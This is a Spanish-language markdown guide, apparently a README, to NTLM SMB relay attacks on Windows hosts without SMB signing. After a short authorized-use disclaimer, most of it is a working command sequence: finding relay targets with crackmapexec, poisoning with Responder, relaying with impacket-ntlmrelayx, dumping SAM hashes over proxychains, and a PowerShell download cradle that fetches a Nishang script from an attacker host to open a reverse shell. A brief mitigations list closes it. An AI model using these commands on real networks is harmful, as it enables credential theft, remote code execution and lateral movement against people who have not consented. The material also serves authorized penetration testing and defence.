# NTLM SMB Relay Attack Guide


## 📌 Descripción
Guía técnica para realizar ataques de **NTLM Relay** contra sistemas Windows con SMB signing deshabilitado, permitiendo ejecución remota de comandos, robo de hashes y movimiento lateral.

## ⚠️ Requisitos Legales
- **Solo para pentesting autorizado o entornos de laboratorio**.  
- Nunca atacar sistemas sin permiso explícito.

---

## 🔧 Herramientas Necesarias
- **Kali Linux** (o distribución con herramientas preinstaladas).  
- **Impacket**: `sudo apt install impacket`.  
- **CrackMapExec**: `sudo apt install crackmapexec`.  
- **Responder**: `sudo apt install responder`.  

---

## 🚀 Pasos del Ataque

### 1️⃣ Identificar sistemas vulnerables
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
````
   
Salida esperada:
SMB   192.168.1.10    SIGNING:Not enforced  # ¡Vulnerable!

2️⃣ Configurar targets.txt
plaintext
Copy

smb://192.168.1.10
smb://192.168.1.20

3️⃣ Desactivar SMB/HTTP en Responder
 ```bash
/etc/responder/Responder.conf:
````
SMB = Off
HTTP = Off

4️⃣ Iniciar NTLM Relay
````bash
impacket-ntlmrelayx -smb2support -tf targets.txt -socks -debug
````
5️⃣ Iniciar Responder (en otra terminal)
```bash
sudo responder -I eth0
````

6️⃣ Explotación con ProxyChains

Editar socks4 127.0.0.1 1080
```bash
/etc/proxychains4.conf:
````

Ejemplo: Robar hashes SAM
````bash
proxychains4 crackmapexec smb 192.168.1.10 -u '' -p '' --sam
````

Ejemplo: Reverse Shell

Preparar shell.ps1 (ejemplo de Nishang):

 ```bash
 IEX(New-Object Net.WebClient).DownloadString("http://192.168.1.100:8000/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 443
````
Servir el script:
````bash  
python3 -m http.server 8000
````
Ejecutar relay:

````bash
impacket-ntlmrelayx -smb2support -tf targets.txt -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8000/shell.ps1')\""
````

🛡️ Mitigaciones

Habilitar SMB Signing en GPO:

Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Microsoft network server: Digitally sign communications (always).

Deshabilitar NTLM y usar Kerberos.

Segmentar redes para limitar tráfico SMB.
